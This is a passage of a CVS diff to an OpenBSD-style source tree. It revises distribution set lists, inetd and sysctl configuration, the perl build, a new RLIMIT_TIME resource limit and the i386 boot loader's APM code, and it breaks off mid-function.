 ./etc/printcap
+./etc/profile
 ./etc/protocols
 ./etc/pwd.db
 ./etc/rbootd.conf
@@ -99,6 +86,7 @@
 ./etc/skel/.mailrc
 ./etc/skel/.profile
 ./etc/skel/.rhosts
+./etc/skel/.ssh.known_hosts
 ./etc/sliphome/slip.hosts
 ./etc/sliphome/slip.login
 ./etc/spwd.db
@@ -114,36 +102,17 @@
 ./etc/systrace/usr_sbin_named
 ./etc/ttys
 ./etc/weekly
-./root/.cshrc
-./root/.klogin
-./root/.login
-./root/.profile
 ./var/at/at.deny
 ./var/crash/minfree
-./var/cron/log
 ./var/cron/tabs/root
 ./var/db/locate.database
 ./var/games/rogue.scores
 ./var/games/tetris.scores
-./var/log/authlog
-./var/log/daemon
-./var/log/failedlogin
-./var/log/ftpd
-./var/log/lastlog
-./var/log/lpd-errs
-./var/log/maillog
 ./var/log/messages
-./var/log/secure
 ./var/log/sendmail.st
 ./var/log/wtmp
-./var/log/xferlog
 ./var/mail/root
 ./var/msgs/bounds
-./var/named/named.boot
-./var/named/namedb/localhost.rev
-./var/named/namedb/localhost.v6.rev
-./var/named/namedb/localhost.zone
-./var/named/namedb/root.cache
 ./var/run/utmp
 ./var/www/cgi-bin/printenv
 ./var/www/cgi-bin/test-cgi
Index: src/distrib/sets/lists/game/mi
===================================================================
RCS file: /cvs/src/distrib/sets/lists/game/mi,v
retrieving revision 1.14
diff -u -r1.14 mi
--- src/distrib/sets/lists/game/mi	23 May 2002 18:44:47 -0000	1.14
+++ src/distrib/sets/lists/game/mi	20 Dec 2002 23:24:41 -0000
@@ -1,3 +1,5 @@
+./usr/bin/dict
+./usr/bin/tinyirc
 ./usr/games/adventure
 ./usr/games/arithmetic
 ./usr/games/atc
@@ -6,6 +8,7 @@
 ./usr/games/battlestar
 ./usr/games/bcd
 ./usr/games/boggle
+./usr/games/brainfuck
 ./usr/games/bs
 ./usr/games/caesar
 ./usr/games/canfield
@@ -24,6 +27,7 @@
 ./usr/games/mille
 ./usr/games/monop
 ./usr/games/morse
+./usr/games/ndat
 ./usr/games/number
 ./usr/games/phantasia
 ./usr/games/pig
@@ -45,6 +49,7 @@
 ./usr/games/wargames
 ./usr/games/worm
 ./usr/games/worms
+./usr/games/wtf
 ./usr/games/wump
 ./usr/share/games/atc/Atlantis
 ./usr/share/games/atc/Game_List
@@ -120,6 +125,7 @@
 ./usr/share/games/quiz.db/trek
 ./usr/share/games/quiz.db/ucc
 ./usr/share/games/wump.info
+./usr/share/man/cat1/dict.0
 ./usr/share/man/cat6/adventure.0
 ./usr/share/man/cat6/arithmetic.0
 ./usr/share/man/cat6/atc.0
@@ -128,6 +134,7 @@
 ./usr/share/man/cat6/battlestar.0
 ./usr/share/man/cat6/bcd.0
 ./usr/share/man/cat6/boggle.0
+./usr/share/man/cat6/brainfuck.0
 ./usr/share/man/cat6/caesar.0
 ./usr/share/man/cat6/canfield.0
 ./usr/share/man/cat6/cribbage.0
@@ -159,7 +166,9 @@
 ./usr/share/man/cat6/trek.0
 ./usr/share/man/cat6/worm.0
 ./usr/share/man/cat6/worms.0
+./usr/share/man/cat6/wtf.0
 ./usr/share/man/cat6/wump.0
+./usr/share/misc/acronyms
 ./var/games/atc_score
 ./var/games/battlestar.log
 ./var/games/cfscores
Index: src/distrib/sets/lists/man/md.i386
===================================================================
RCS file: /cvs/src/distrib/sets/lists/man/md.i386,v
retrieving revision 1.29
diff -u -r1.29 md.i386
--- src/distrib/sets/lists/man/md.i386	25 May 2000 21:56:28 -0000	1.29
+++ src/distrib/sets/lists/man/md.i386	20 Dec 2002 23:24:41 -0000
@@ -1,4 +1,3 @@
-./usr/share/man/cat1/ld.so.0
 ./usr/share/man/cat1/ldd.0
 ./usr/share/man/cat5/ar.0
 ./usr/share/man/cat5/ranlib.0
Index: src/distrib/sets/lists/man/mi
===================================================================
RCS file: /cvs/src/distrib/sets/lists/man/mi,v
retrieving revision 1.413
diff -u -r1.413 mi
--- src/distrib/sets/lists/man/mi	19 Dec 2002 09:59:30 -0000	1.413
+++ src/distrib/sets/lists/man/mi	20 Dec 2002 23:24:42 -0000
@@ -67,28 +67,6 @@
 ./usr/share/info/cvsclient.info-3
 ./usr/share/info/dc.info
 ./usr/share/info/dir
-./usr/share/info/g77.info
-./usr/share/info/g77.info-1
-./usr/share/info/g77.info-10
-./usr/share/info/g77.info-11
-./usr/share/info/g77.info-12
-./usr/share/info/g77.info-13
-./usr/share/info/g77.info-14
-./usr/share/info/g77.info-15
-./usr/share/info/g77.info-16
-./usr/share/info/g77.info-17
-./usr/share/info/g77.info-18
-./usr/share/info/g77.info-19
-./usr/share/info/g77.info-2
-./usr/share/info/g77.info-20
-./usr/share/info/g77.info-21
-./usr/share/info/g77.info-3
-./usr/share/info/g77.info-4
-./usr/share/info/g77.info-5
-./usr/share/info/g77.info-6
-./usr/share/info/g77.info-7
-./usr/share/info/g77.info-8
-./usr/share/info/g77.info-9
 ./usr/share/info/gcc.info
 ./usr/share/info/gcc.info-1
 ./usr/share/info/gcc.info-10
@@ -134,14 +112,12 @@
 ./usr/share/info/gdbint.info-1
 ./usr/share/info/gdbint.info-2
 ./usr/share/info/gzip.info
-./usr/share/info/heimdal.info
 ./usr/share/info/history.info
 ./usr/share/info/info-stnd.info
 ./usr/share/info/info-stnd.info-1
 ./usr/share/info/info-stnd.info-2
 ./usr/share/info/info-stnd.info-3
 ./usr/share/info/info.info
-./usr/share/info/kth-krb.info
 ./usr/share/info/mmalloc.info
 ./usr/share/info/readline.info
 ./usr/share/info/rluserman.info
@@ -169,7 +145,6 @@
 ./usr/share/man/cat1/a2p.0
 ./usr/share/man/cat1/addftinfo.0
 ./usr/share/man/cat1/afmtodit.0
-./usr/share/man/cat1/afslog.0
 ./usr/share/man/cat1/alias.0
 ./usr/share/man/cat1/alpha
 ./usr/share/man/cat1/amiga
@@ -221,6 +196,8 @@
 ./usr/share/man/cat1/cpio.0
 ./usr/share/man/cat1/cpp.0
 ./usr/share/man/cat1/crontab.0
+./usr/share/man/cat1/crunchgen.0
+./usr/share/man/cat1/crunchide.0
 ./usr/share/man/cat1/csh.0
 ./usr/share/man/cat1/ctags.0
 ./usr/share/man/cat1/cu.0
@@ -234,10 +211,8 @@
 ./usr/share/man/cat1/df.0
 ./usr/share/man/cat1/diff.0
 ./usr/share/man/cat1/diff3.0
-./usr/share/man/cat1/dig.0
 ./usr/share/man/cat1/dirname.0
 ./usr/share/man/cat1/dirs.0
-./usr/share/man/cat1/dnsquery.0
 ./usr/share/man/cat1/domainname.0
 ./usr/share/man/cat1/dprofpp.0
 ./usr/share/man/cat1/du.0
@@ -268,11 +243,9 @@
 ./usr/share/man/cat1/fold.0
 ./usr/share/man/cat1/foreach.0
 ./usr/share/man/cat1/from.0
-./usr/share/man/cat1/fs.0
 ./usr/share/man/cat1/fsplit.0
 ./usr/share/man/cat1/fstat.0
 ./usr/share/man/cat1/ftp.0
-./usr/share/man/cat1/g77.0
 ./usr/share/man/cat1/gencat.0
 ./usr/share/man/cat1/getconf.0
 ./usr/share/man/cat1/getopt.0
@@ -324,14 +297,9 @@
 ./usr/share/man/cat1/jobs.0
 ./usr/share/man/cat1/join.0
 ./usr/share/man/cat1/jot.0
-./usr/share/man/cat1/kauth.0
-./usr/share/man/cat1/kdestroy.0
 ./usr/share/man/cat1/kdump.0
-./usr/share/man/cat1/kerberos.0
 ./usr/share/man/cat1/keynote.0
 ./usr/share/man/cat1/kill.0
-./usr/share/man/cat1/kinit.0
-./usr/share/man/cat1/klist.0
 ./usr/share/man/cat1/ksh.0
 ./usr/share/man/cat1/ktrace.0
 ./usr/share/man/cat1/lam.0
@@ -408,7 +376,6 @@
 ./usr/share/man/cat1/otp-sha1.0
 ./usr/share/man/cat1/page.0
 ./usr/share/man/cat1/pagesize.0
-./usr/share/man/cat1/pagsh.0
 ./usr/share/man/cat1/passwd.0
 ./usr/share/man/cat1/paste.0
 ./usr/share/man/cat1/patch.0
@@ -524,7 +491,6 @@
 ./usr/share/man/cat1/psbb.0
 ./usr/share/man/cat1/psed.0
 ./usr/share/man/cat1/pstruct.0
-./usr/share/man/cat1/pts.0
 ./usr/share/man/cat1/purgestat.0
 ./usr/share/man/cat1/pushd.0
 ./usr/share/man/cat1/pwd.0
@@ -664,9 +630,6 @@
 ./usr/share/man/cat1/xargs.0
 ./usr/share/man/cat1/xsubpp.0
 ./usr/share/man/cat1/yes.0
-./usr/share/man/cat1/ypcat.0
-./usr/share/man/cat1/ypmatch.0
-./usr/share/man/cat1/ypwhich.0
 ./usr/share/man/cat1/yyfix.0
 ./usr/share/man/cat1/zcat.0
 ./usr/share/man/cat1/zcmp.0
@@ -1521,13 +1484,8 @@
 ./usr/share/man/cat4/zero.0
 ./usr/share/man/cat5
 ./usr/share/man/cat5/.rhosts.0
-./usr/share/man/cat5/CellServDB.0
-./usr/share/man/cat5/DynRootDB.0
-./usr/share/man/cat5/SuidCells.0
-./usr/share/man/cat5/ThisCell.0
 ./usr/share/man/cat5/a.out.0
 ./usr/share/man/cat5/acct.0
-./usr/share/man/cat5/afsd.conf.0
 ./usr/share/man/cat5/aliases.0
 ./usr/share/man/cat5/alpha
 ./usr/share/man/cat5/amiga
@@ -1583,7 +1541,6 @@
 ./usr/share/man/cat5/krb.equiv.0
 ./usr/share/man/cat5/krb.extra.0
 ./usr/share/man/cat5/krb.realms.0
-./usr/share/man/cat5/krb5.conf.0
 ./usr/share/man/cat5/lastlog.0
 ./usr/share/man/cat5/link.0
 ./usr/share/man/cat5/login.conf.0
@@ -1601,7 +1558,6 @@
 ./usr/share/man/cat5/mvme88k
 ./usr/share/man/cat5/mvmeppc
 ./usr/share/man/cat5/netgroup.0
-./usr/share/man/cat5/netid.0
 ./usr/share/man/cat5/networks.0
 ./usr/share/man/cat5/newsyslog.conf.0
 ./usr/share/man/cat5/passwd.0
@@ -1617,7 +1573,6 @@
 ./usr/share/man/cat5/resolver.0
 ./usr/share/man/cat5/rpc.0
 ./usr/share/man/cat5/rtadvd.conf.0
-./usr/share/man/cat5/securenet.0
 ./usr/share/man/cat5/services.0
 ./usr/share/man/cat5/shells.0
 ./usr/share/man/cat5/skey.0
@@ -1643,7 +1598,6 @@
 ./usr/share/man/cat5/vgrindefs.0
 ./usr/share/man/cat5/wsconsctl.conf.0
 ./usr/share/man/cat5/wtmp.0
-./usr/share/man/cat5/ypserv.acl.0
 ./usr/share/man/cat6
 ./usr/share/man/cat6/bs.0
 ./usr/share/man/cat6/cfscores.0
@@ -1689,7 +1643,6 @@
 ./usr/share/man/cat8/accton.0
 ./usr/share/man/cat8/activadm.0
 ./usr/share/man/cat8/activinit.0
-./usr/share/man/cat8/afsd.0
 ./usr/share/man/cat8/alpha
 ./usr/share/man/cat8/alpha/MAKEDEV.0
 ./usr/share/man/cat8/alpha/boot_alpha.0
@@ -1725,7 +1678,6 @@
 ./usr/share/man/cat8/bootpef.0
 ./usr/share/man/cat8/bootpgw.0
 ./usr/share/man/cat8/bootptest.0
-./usr/share/man/cat8/bos.0
 ./usr/share/man/cat8/brconfig.0
 ./usr/share/man/cat8/ccdconfig.0
 ./usr/share/man/cat8/certpatch.0
@@ -1762,7 +1714,6 @@
 ./usr/share/man/cat8/dumpfs.0
 ./usr/share/man/cat8/editmap.0
 ./usr/share/man/cat8/edquota.0
-./usr/share/man/cat8/ext_srvtab.0
 ./usr/share/man/cat8/extattrctl.0
 ./usr/share/man/cat8/faithd.0
 ./usr/share/man/cat8/faq.0
@@ -1800,8 +1751,6 @@
 ./usr/share/man/cat8/hppa/wsconscfg.0
 ./usr/share/man/cat8/hppa/wsconsctl.0
 ./usr/share/man/cat8/hppa/wsfontload.0
-./usr/share/man/cat8/hprop.0
-./usr/share/man/cat8/hpropd.0
 ./usr/share/man/cat8/httpd.0
 ./usr/share/man/cat8/i386
 ./usr/share/man/cat8/i386/MAKEDEV.0
@@ -1830,32 +1779,13 @@
 ./usr/share/man/cat8/iostat.0
 ./usr/share/man/cat8/ipsecadm.0
 ./usr/share/man/cat8/isakmpd.0
-./usr/share/man/cat8/kadmin.0
-./usr/share/man/cat8/kadmind.0
-./usr/share/man/cat8/kauthd.0
-./usr/share/man/cat8/kdb_destroy.0
-./usr/share/man/cat8/kdb_edit.0
-./usr/share/man/cat8/kdb_init.0
-./usr/share/man/cat8/kdb_util.0
-./usr/share/man/cat8/kdc.0
-./usr/share/man/cat8/kerberos.0
 ./usr/share/man/cat8/kgmon.0
-./usr/share/man/cat8/kpasswdd.0
-./usr/share/man/cat8/kprop.0
-./usr/share/man/cat8/kpropd.0
-./usr/share/man/cat8/ksrvutil.0
-./usr/share/man/cat8/kstash.0
-./usr/share/man/cat8/ktutil.0
 ./usr/share/man/cat8/kvm_mkdb.0
 ./usr/share/man/cat8/lmccontrol.0
 ./usr/share/man/cat8/locate.updatedb.0
 ./usr/share/man/cat8/login_activ.0
 ./usr/share/man/cat8/login_chpass.0
 ./usr/share/man/cat8/login_crypto.0
-./usr/share/man/cat8/login_krb4-or-pwd.0
-./usr/share/man/cat8/login_krb4.0
-./usr/share/man/cat8/login_krb5-or-pwd.0
-./usr/share/man/cat8/login_krb5.0
 ./usr/share/man/cat8/login_lchpass.0
 ./usr/share/man/cat8/login_passwd.0
 ./usr/share/man/cat8/login_radius.0
@@ -1885,14 +1815,11 @@
 ./usr/share/man/cat8/mailq.0
 ./usr/share/man/cat8/mailstats.0
 ./usr/share/man/cat8/mailwrapper.0
-./usr/share/man/cat8/makedbm.0
 ./usr/share/man/cat8/makekey.0
 ./usr/share/man/cat8/makemap.0
 ./usr/share/man/cat8/makewhatis.0
 ./usr/share/man/cat8/mfs.0
-./usr/share/man/cat8/mkalias.0
 ./usr/share/man/cat8/mkhybrid.0
-./usr/share/man/cat8/mknetid.0
 ./usr/share/man/cat8/mknod.0
 ./usr/share/man/cat8/modload.0
 ./usr/share/man/cat8/modstat.0
@@ -1922,13 +1849,8 @@
 ./usr/share/man/cat8/mvme68k/installboot.0
 ./usr/share/man/cat8/mvme88k
 ./usr/share/man/cat8/mvmeppc
-./usr/share/man/cat8/named-xfer.0
-./usr/share/man/cat8/named.0
-./usr/share/man/cat8/named.reload.0
-./usr/share/man/cat8/named.restart.0
 ./usr/share/man/cat8/ncheck.0
 ./usr/share/man/cat8/ncheck_ffs.0
-./usr/share/man/cat8/ndc.0
 ./usr/share/man/cat8/ndp.0
 ./usr/share/man/cat8/netgroup_mkdb.0
 ./usr/share/man/cat8/netstart.0
@@ -1938,7 +1860,6 @@
 ./usr/share/man/cat8/newsyslog.0
 ./usr/share/man/cat8/nfsd.0
 ./usr/share/man/cat8/nologin.0
-./usr/share/man/cat8/nslookup.0
 ./usr/share/man/cat8/ntalkd.0
 ./usr/share/man/cat8/pac.0
 ./usr/share/man/cat8/pcnfsd.0
@@ -1976,7 +1897,6 @@
 ./usr/share/man/cat8/renice.0
 ./usr/share/man/cat8/repquota.0
 ./usr/share/man/cat8/restore.0
-./usr/share/man/cat8/revnetgroup.0
 ./usr/share/man/cat8/rip6query.0
 ./usr/share/man/cat8/rmail.0
 ./usr/share/man/cat8/rmgroup.0
@@ -1994,7 +1914,6 @@
 ./usr/share/man/cat8/rpc.rusersd.0
 ./usr/share/man/cat8/rpc.rwalld.0
 ./usr/share/man/cat8/rpc.sprayd.0
-./usr/share/man/cat8/rpc.yppasswdd.0
 ./usr/share/man/cat8/rpcinfo.0
 ./usr/share/man/cat8/rquotad.0
 ./usr/share/man/cat8/rrestore.0
@@ -2049,10 +1968,7 @@
 ./usr/share/man/cat8/sshd.0
 ./usr/share/man/cat8/ssl.0
 ./usr/share/man/cat8/starttls.0
-./usr/share/man/cat8/stdethers.0
-./usr/share/man/cat8/stdhosts.0
 ./usr/share/man/cat8/sticky.0
-./usr/share/man/cat8/string2key.0
 ./usr/share/man/cat8/sudo.0
 ./usr/share/man/cat8/suexec.0
 ./usr/share/man/cat8/sun3
@@ -2094,27 +2010,13 @@
 ./usr/share/man/cat8/vax/boot_vax.0
 ./usr/share/man/cat8/vax/format.0
 ./usr/share/man/cat8/vax/kbd.0
-./usr/share/man/cat8/verify_krb5_conf.0
 ./usr/share/man/cat8/vipw.0
 ./usr/share/man/cat8/visudo.0
 ./usr/share/man/cat8/vmstat.0
 ./usr/share/man/cat8/vnconfig.0
-./usr/share/man/cat8/vos.0
 ./usr/share/man/cat8/vpn.0
 ./usr/share/man/cat8/wicontrol.0
 ./usr/share/man/cat8/yp.0
-./usr/share/man/cat8/ypbind.0
-./usr/share/man/cat8/ypinit.0
-./usr/share/man/cat8/yppasswdd.0
-./usr/share/man/cat8/yppoll.0
-./usr/share/man/cat8/yppush.0
-./usr/share/man/cat8/ypserv.0
-./usr/share/man/cat8/ypset.0
-./usr/share/man/cat8/yptest.0
-./usr/share/man/cat8/ypxfr.0
-./usr/share/man/cat8/ypxfr_1perday.0
-./usr/share/man/cat8/ypxfr_1perhour.0
-./usr/share/man/cat8/ypxfr_2perday.0
 ./usr/share/man/cat8/zdump.0
 ./usr/share/man/cat8/zic.0
 ./usr/share/man/cat9
Index: src/distrib/sets/lists/misc/mi
===================================================================
RCS file: /cvs/src/distrib/sets/lists/misc/mi,v
retrieving revision 1.5
diff -u -r1.5 mi
--- src/distrib/sets/lists/misc/mi	25 Jul 2000 16:19:04 -0000	1.5
+++ src/distrib/sets/lists/misc/mi	20 Dec 2002 23:24:42 -0000
@@ -164,25 +164,6 @@
 ./usr/share/doc/smm/09.sendmail/Makefile
 ./usr/share/doc/smm/09.sendmail/intro.me
 ./usr/share/doc/smm/10.named
-./usr/share/doc/smm/10.named/00macs.me
-./usr/share/doc/smm/10.named/00title.me
-./usr/share/doc/smm/10.named/Makefile
-./usr/share/doc/smm/10.named/ack.me
-./usr/share/doc/smm/10.named/build.me
-./usr/share/doc/smm/10.named/files.me
-./usr/share/doc/smm/10.named/intro.me
-./usr/share/doc/smm/10.named/manage.me
-./usr/share/doc/smm/10.named/named.boot.cache
-./usr/share/doc/smm/10.named/named.boot.primary
-./usr/share/doc/smm/10.named/named.boot.secondary
-./usr/share/doc/smm/10.named/named.local
-./usr/share/doc/smm/10.named/ns.me
-./usr/share/doc/smm/10.named/resolv.conf
-./usr/share/doc/smm/10.named/root.cache
-./usr/share/doc/smm/10.named/setup.me
-./usr/share/doc/smm/10.named/types.me
-./usr/share/doc/smm/10.named/ucbhosts
-./usr/share/doc/smm/10.named/ucbhosts.rev
 ./usr/share/doc/smm/11.timedop
 ./usr/share/doc/smm/12.timed
 ./usr/share/doc/smm/13.amd
Index: src/etc/inetd.conf
===================================================================
RCS file: /cvs/src/etc/inetd.conf,v
retrieving revision 1.50
diff -u -r1.50 inetd.conf
--- src/etc/inetd.conf	2 Aug 2002 23:27:11 -0000	1.50
+++ src/etc/inetd.conf	20 Dec 2002 23:24:42 -0000
@@ -22,6 +22,7 @@
 #ntalk		dgram	udp	wait	root	/usr/libexec/ntalkd	ntalkd
 #bootps		dgram	udp	wait	root	/usr/sbin/bootpd	bootpd
 #pop3		stream	tcp	nowait	root	/usr/sbin/popa3d	popa3d
+#127.0.0.1:6667	stream	tcp	nowait	proxy	/usr/libexec/ircbridge	ircbridge secret -6
 # Internal services
 #echo		stream	tcp	nowait	root	internal
 #echo		stream	tcp6	nowait	root	internal
Index: src/etc/sysctl.conf
===================================================================
RCS file: /cvs/src/etc/sysctl.conf,v
retrieving revision 1.28
diff -u -r1.28 sysctl.conf
--- src/etc/sysctl.conf	31 May 2002 19:35:06 -0000	1.28
+++ src/etc/sysctl.conf	20 Dec 2002 23:24:42 -0000
@@ -11,12 +11,12 @@
 #net.inet.esp.enable=0		# 0=Disable the ESP IPsec protocol
 #net.inet.ah.enable=0		# 0=Disable the AH IPsec protocol
 #net.inet.ipcomp.enable=1	# 1=Enable the IPCOMP protocol
-#net.inet.tcp.ecn=1		# 1=Enable the TCP ECN extension
+#net.inet.tcp.ecn=0		# 0=Disable the TCP ECN extension
 #ddb.panic=0			# 0=Do not drop into ddb on a kernel panic
 #ddb.console=1			# 1=Permit entry of ddb from the console
 #fs.posix.setuid=0		# 0=Traditional BSD chown() semantics
 #vm.swapencrypt.enable=1	# 1=Encrypt pages that go to swap
 #vfs.nfs.iothreads=4		# number of nfsio kernel threads
 #net.inet.ip.mtudisc=0		# 0=disable tcp mtu discovery
-#kern.usercrypto=1		# 1=enable userland use of /dev/crypto
+#kern.usercrypto=0		# 0=disable userland use of /dev/crypto
 #kern.splassert=2		# 2=enable and verbose error messages.
Index: src/gnu/usr.bin/perl/Configure
===================================================================
RCS file: /cvs/src/gnu/usr.bin/perl/Configure,v
retrieving revision 1.11
diff -u -r1.11 Configure
--- src/gnu/usr.bin/perl/Configure	27 Oct 2002 22:24:54 -0000	1.11
+++ src/gnu/usr.bin/perl/Configure	20 Dec 2002 23:24:42 -0000
@@ -747,7 +747,7 @@
 dlsrc=''
 ld=''
 lddlflags=''
-usedl=''
+usedl=${USEDL:-''}
 doublesize=''
 ebcdic=''
 fflushNULL=''
Index: src/gnu/usr.bin/perl/Makefile.bsd-wrapper
===================================================================
RCS file: /cvs/src/gnu/usr.bin/perl/Makefile.bsd-wrapper,v
retrieving revision 1.51
diff -u -r1.51 Makefile.bsd-wrapper
--- src/gnu/usr.bin/perl/Makefile.bsd-wrapper	27 Oct 2002 22:24:54 -0000	1.51
+++ src/gnu/usr.bin/perl/Makefile.bsd-wrapper	20 Dec 2002 23:24:42 -0000
@@ -6,9 +6,15 @@
 # To build a threaded perl, uncomment this.  Currently, there are bugs...
 #THREADED=-Dusethreads
 
-# For ``NOMAN''
+# For "NOMAN" and "NOPIC"
 .include <bsd.own.mk>
 
+.if !defined(NOPIC)
+USE_DL=y
+.else
+USE_DL=n
+.endif
+
 # Our lndir is hacked; specify a full path to avoid potential conflicts
 # with the one installed with X11.
 LNDIR=		/usr/bin/lndir
@@ -466,7 +472,7 @@
 	regexec.c utf8.c taint.c deb.c universal.c xsutils.c globals.c perl.c \
 	perlio.c perlapi.c numeric.c locale.c pp_pack.c pp_sort.c
 
-CPPFLAGS+= -DPERL_CORE -DPERL_RANDOM_DEVICE=\"/dev/arandom\" -I.
+CPPFLAGS+= -DPERL_CORE -DPERL_RANDOM_DEVICE=\"/dev/arandom\" -I. -I${.CURDIR}
 
 .if defined (INSTALL_STRIP) && ${INSTALL_STRIP} == "-s"
 INST_PROG='/usr/bin/install -cs'
@@ -498,7 +504,7 @@
 
 config.sh:	${.OBJDIR}/config.over
 	cd ${.OBJDIR} && PATH="/bin:/usr/bin:/sbin:/usr/sbin" \
-	 exec /bin/sh Configure -Dopenbsd_distribution=defined ${THREADED} -dsE
+	 USEDL=${USE_DL} exec /bin/sh Configure -Dopenbsd_distribution=defined ${THREADED} -dsE
 
 Policy.sh:
 	cd ${.OBJDIR} && exec /bin/sh Policy_sh.SH
Index: src/gnu/usr.sbin/sendmail/sendmail/conf.c
===================================================================
RCS file: /cvs/src/gnu/usr.sbin/sendmail/sendmail/conf.c,v
retrieving revision 1.16
diff -u -r1.16 conf.c
--- src/gnu/usr.sbin/sendmail/sendmail/conf.c	15 Sep 2002 02:23:13 -0000	1.16
+++ src/gnu/usr.sbin/sendmail/sendmail/conf.c	20 Dec 2002 23:24:42 -0000
@@ -3693,6 +3693,7 @@
 
 	lim.rlim_cur = lim.rlim_max = RLIM_INFINITY;
 	(void) setrlimit(RLIMIT_CPU, &lim);
+	(void) setrlimit(RLIMIT_TIME, &lim);
 	(void) setrlimit(RLIMIT_FSIZE, &lim);
 # ifdef RLIMIT_NOFILE
 	lim.rlim_cur = lim.rlim_max = FD_SETSIZE;
@@ -6044,4 +6045,3 @@
 #endif /* _FFR_USE_SETLOGIN */
 	NULL
 };
-
Index: src/lib/libc/gen/login_cap.c
===================================================================
RCS file: /cvs/src/lib/libc/gen/login_cap.c,v
retrieving revision 1.15
diff -u -r1.15 login_cap.c
--- src/lib/libc/gen/login_cap.c	15 Dec 2002 13:26:44 -0000	1.15
+++ src/lib/libc/gen/login_cap.c	20 Dec 2002 23:24:42 -0000
@@ -492,6 +492,7 @@
 	char *	name;
 } r_list[] = {
 	{ RLIMIT_CPU,		CTIME, "cputime", },
+	{ RLIMIT_TIME,		CTIME, "time", },
 	{ RLIMIT_FSIZE,		CSIZE, "filesize", },
 	{ RLIMIT_DATA,		CSIZE, "datasize", },
 	{ RLIMIT_STACK,		CSIZE, "stacksize", },
Index: src/lib/libc/sys/getrlimit.2
===================================================================
RCS file: /cvs/src/lib/libc/sys/getrlimit.2,v
retrieving revision 1.11
diff -u -r1.11 getrlimit.2
--- src/lib/libc/sys/getrlimit.2	18 Oct 2000 05:11:47 -0000	1.11
+++ src/lib/libc/sys/getrlimit.2	20 Dec 2002 23:24:42 -0000
@@ -68,6 +68,9 @@
 .It Li RLIMIT_CPU
 The maximum amount of cpu time (in seconds) to be used by
 each process.
+.It Li RLIMIT_TIME
+The maximum amount of human time (in seconds) to be used by
+each process.
 .It Li RLIMIT_DATA
 The maximum size (in bytes) of the data segment for a process;
 this defines how far a program may extend its break with the
Index: src/lib/libutil/passwd.c
===================================================================
RCS file: /cvs/src/lib/libutil/passwd.c,v
retrieving revision 1.36
diff -u -r1.36 passwd.c
--- src/lib/libutil/passwd.c	31 Jul 2002 21:53:12 -0000	1.36
+++ src/lib/libutil/passwd.c	20 Dec 2002 23:24:42 -0000
@@ -354,6 +354,7 @@
 	/* Unlimited resource limits. */
 	rlim.rlim_cur = rlim.rlim_max = RLIM_INFINITY;
 	(void)setrlimit(RLIMIT_CPU, &rlim);
+	(void)setrlimit(RLIMIT_TIME, &rlim);
 	(void)setrlimit(RLIMIT_FSIZE, &rlim);
 	(void)setrlimit(RLIMIT_STACK, &rlim);
 	(void)setrlimit(RLIMIT_DATA, &rlim);
Index: src/sys/arch/i386/stand/libsa/apmprobe.c
===================================================================
RCS file: /cvs/src/sys/arch/i386/stand/libsa/apmprobe.c,v
retrieving revision 1.9
diff -u -r1.9 apmprobe.c
--- src/sys/arch/i386/stand/libsa/apmprobe.c	20 Jun 2002 20:22:36 -0000	1.9
+++ src/sys/arch/i386/stand/libsa/apmprobe.c	20 Dec 2002 23:24:42 -0000
@@ -68,6 +68,8 @@
 
 extern int debug;
 
+static int apm_is_connected;
+
 static __inline u_int
 apm_check()
 {
@@ -101,6 +103,7 @@
 			 : "=a" (rv)
 			 : "0" (APM_DISCONNECT), "b" (APM_DEV_APM_BIOS)
 			 : "%ecx", "%edx", "cc");
+	if (!(rv & 0xff)) apm_is_connected = 0;
 	return (rv & 0xff)? rv >> 8 : 0;
 }
 
@@ -145,6 +148,7 @@
 			ai->apm_code16_base, ai->apm_code16_len,
 			ai->apm_data_base,   ai->apm_data_len);
 #endif
+	apm_is_connected = 2;
 	/* inform apm bios about our driver version */
 	__asm __volatile (DOINT(0x15) "\n\t"
 			  "setc %b1\n\t"
@@ -158,8 +162,61 @@
 	return 0;
 }
 
+static __inline int
+apm_driver_version(v)
+{
+	register u_int16_t rv;
+	__asm __volatile(DOINT(0x15) "\n\t"
+			 "setc %b0"
+			 : "=a" (rv)
+			 : "0" (APM_DRIVER_VERSION), "b" (APM_DEV_APM_BIOS), "c" (v)
+			 : "%edx", "cc");
+	return (rv & 0xff)? rv >> 8 : 0;
+}
+
+static __inline int
+apm_connect_real(ai)
+	bios_apminfo_t *ai;
+{
+	register u_int16_t f;
+	__asm __volatile (DOINT(0x15) "\n\t"
+			  "setc %b1\n\t"
+			  "movb %%ah, %h1\n\t"
+			  "movzwl %%ax, %%eax\n\tshll $4, %0\n\t"
+			  "movzwl %%cx, %%ecx\n\tshll $4, %2\n\t"
+			  "movzwl %%dx, %%edx\n\tshll $4, %3\n\t"
+			  : "=a" (ai->apm_code32_base),
+			    "=b" (f),
+			    "=c" (ai->apm_code16_base),
+			    "=d" (ai->apm_data_base)
+			  : "0" (APM_REAL_CONNECT), "1" (APM_DEV_APM_BIOS)
+			  : "cc");
+	ai->apm_entry    = BIOS_regs.biosr_bx;
+#if 0
+	ai->apm_code_len = BIOS_regs.biosr_si & 0xffff;
+	ai->apm_data_len = BIOS_regs.biosr_di & 0xffff;
+#else
+	ai->apm_code_len = 0x10000;
+	ai->apm_data_len = 0x10000;
+#endif
+	if (!(f & 0xff)) apm_is_connected = 1;
+	return (f & 0xff)? f >> 8 : 0;
+}
+
 static bios_apminfo_t ai;
 
+static __inline int
+apm_set_power_state(devices, how)
+{
+	register u_int16_t rv;
+	__asm __volatile(DOINT(0x15) "\n\t"
+			 "setc %b0"
+			 : "=a" (rv)
+			 : "0" (APM_SET_PWR_STATE), "b" (devices), "c" (how)
+			 : "%edx", "cc");
+	return (rv & 0xff)? rv >> 8 : 0;
+}
+
 void
 apmprobe()
 {
@@ -171,13 +228,12 @@
 #ifdef DEBUG
 		if (debug)
 			printf("apm[%x cs=%x[%x]/%x[%x] ds=%x[%x] @ %x]",
-			       ai.apm_detail,
-			       ai.apm_code32_base, ai.apm_code_len,
-			       ai.apm_code16_base, ai.apm_code16_len,
-			       ai.apm_data_base, ai.apm_data_len,
-			       ai.apm_entry);
-		else
-			printf(" apm");
+			    ai.apm_detail,
+			    ai.apm_code32_base, ai.apm_code_len,
+			    ai.apm_code16_base, ai.apm_code16_len,
+			    ai.apm_data_base, ai.apm_data_len,
+			    ai.apm_entry);
+		  else	printf(" apm");
 #else
 		printf(" apm");
 #endif
@@ -196,3 +252,48 @@
 			i386_round_page(ai.apm_data_base + ai.apm_data_len));
 }
 
+void
+apmturnoff(a1,a2)
+	int a1, a2;
+{
+	bios_apminfo_t ai;
+	int f;
+
+	if (a1 == -1) a1 = APM_DEV_ALLDEVS;
+	if (a2 == -1) a2 = APM_SYS_OFF;
